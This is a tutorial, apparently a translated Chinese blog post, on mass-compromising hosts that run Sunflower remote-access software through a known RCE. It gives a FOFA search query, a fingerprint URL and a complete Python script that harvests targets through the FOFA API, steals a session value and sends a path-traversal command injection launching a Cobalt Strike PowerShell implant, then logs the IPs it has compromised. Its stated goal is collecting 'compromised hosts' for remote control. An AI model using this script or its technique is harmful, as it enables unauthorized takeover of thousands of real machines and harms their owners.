## Bulk NDAY Online Deployment

## Sunflower RCE

In real-world operations, it is often inconvenient to test directly from your own host.

At this point, you need to obtain some compromised hosts to make certain operations easier. Today I will provide everyone with one approach, which can also be considered a line of thinking.

First, it has to be said that Sunflower has a very large user base, with countless hosts both inside and outside China. The RCE vulnerability has been public for more than a year, yet many hosts and servers still have this RCE. Some vulnerable hosts do not even have antivirus software installed. The operations staff are simply lazy to an extreme degree.

The first step in obtaining hosts is definitely to determine the attributes of the targets first. That improves the chance of success.

### Asset Positioning

FOFA syntax:

```
body="Verification failure" && country="CN"
```

29,469 internet-exposed assets.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402132817799.png)

### Script Implementation

Use Python to connect to the FOFA API for automated information collection.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402140350316.png)

Next is the vulnerability fingerprint, used to further confirm assets.

```
/cgi-bin/rpc?action=verify-haras
```

Python implementation:

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402151020718.png)

With the technique above, you can already find some vulnerable hosts. This is also a common trick for bulk SRC work. But our goal is online deployment, remote control, and compromised hosts.

Because most Sunflower installations are on Windows hosts, here we use the penetration testing tool Cobalt Strike Screen.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20231220140210146.png)

Generate a PowerShell remote-control script.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402150903308.png)

Python implementation:

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402151243783.png)

Then comes the most critical step: write the full script according to the approach above and run it on a server or compromised host. With one move of a finger, the target host comes online.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402151733538.png)

Automatic CS online deployment. Wake up and check the hosts.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20230402151930603.png)

### Script Source Address

Project address:

https://github.com/ckcsec/xrk-rce

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import base64
def main():
    pn=0
    index=0
    testStr = 'body="Verification failure" && country="CN"'
    b64 = str(base64.b64encode(testStr.encode('utf-8')), 'utf-8')

    pn+=1
    url='https://fofa.info/api/v1/search/all?email=你的邮箱&key=你的key&qbase64={}&size=10000'.format(b64)
    print(url)
    r=requests.get(url=url).json()['results']
    print(r)
    print(len(r))
    for i in r:
        ip=i[0]
        poc(ip)
def poc(ip):
    print(ip)
    url='http://{}/cgi-bin/rpc?action=verify-haras'.format(ip)
    headers={'Host':'{}'.format(ip),
             'Cache-Control':'max-age=0',
             'Upgrade-Insecure-Requests': '1',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'Accept-Encoding': 'gzip, deflate',
             'Accept-Language': 'zh-CN,zh;q=0.9',
             'Connection': 'close'}
    try:
        r=requests.get(url,headers=headers,timeout=5).json()['verify_string']
    except:
        print('超时:',ip)
    else:
        print(r)
        exp(ip, verify_string=r)
def exp(ip,verify_string):
    url = 'http://{}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+cs生成的powershell'.format(ip)
    headers = {'Host':'{}'.format(ip),
               'Cache-Control':'max-age=0',
               'Upgrade-Insecure-Requests':'1',
               'Cookie':'CID={}'.format(verify_string),
               'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
               'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Accept-Encoding':'gzip, deflate',
               'Accept-Language':'zh-CN,zh;q=0.9',
               'Connection': 'close'}
    try:
        r=requests.get(url,headers=headers,timeout=2)
    except:
        print('exp超时:',ip)
    else:
        print('succ:',r.text)
        with open('向日葵REC_SUCC1115.txt','a+') as f:
            f.write(ip)
            f.write('\n')
if __name__ == '__main__':
    main()
```
